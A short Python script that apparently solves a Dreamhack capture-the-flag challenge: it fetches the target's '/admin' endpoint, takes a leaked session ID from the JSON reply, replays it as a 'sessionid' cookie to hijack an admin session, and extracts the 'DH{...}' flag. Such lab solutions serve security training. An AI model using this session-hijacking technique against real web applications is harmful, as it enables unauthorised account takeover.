import re
import requests
import json

host = 'http://host3.dreamhack.games:9001/'

r = requests.get(host + 'admin')
session_id = list(json.loads(r.text).keys())[0]

flag = requests.get(host, cookies={'sessionid': session_id}).text
print(re.search(r'DH{.*?}', flag).group())

